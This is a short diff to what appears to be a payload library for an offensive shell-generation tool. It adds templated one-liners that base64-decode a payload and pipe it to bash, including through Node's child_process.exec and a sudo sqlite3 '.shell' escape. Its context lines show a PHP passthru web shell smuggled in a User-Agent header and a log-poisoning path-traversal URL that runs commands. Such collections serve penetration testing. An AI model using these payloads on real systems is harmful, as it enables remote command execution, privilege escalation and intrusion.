@@ -76,6 +76,8 @@ payload:
       echo {BASE64_URLENCODE} | base64 -d | bash
     - |
       echo+{BASE64_URLENCODE}+|+base64+-d+|+bash
+    - |
+      echo '{BASE64_PY3}' | base64 -d | bash
   c:
     - |
       Compile : gcc shell.c -o shell
@@ -407,7 +409,7 @@ payload:
     - |
       require("child_process").exec("echo {BASE64} | base64 -d | bash")
     - |
-      require("child_process").exec("echo {BASE64} | base64 -d | bash")
+      require("child_process").exec("echo '{BASE64_PY3}' | base64 -d | bash")
     - |
       require("child_process").exec("echo+{BASE64_URLENCODE}+|+base64+-d+|+bash")
     - |
@@ -1673,5 +1675,7 @@ payload:
 
       # User-Agent: <?php passthru($_GET['cmd']); ?> Firefox/91.0
       # http://localhost/blog.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami
-
+  sqlite3:
+    - |
+      sudo sqlite3 /dev/null ".shell echo '{BASE64_PY3}' | base64 -d | bash"
 """
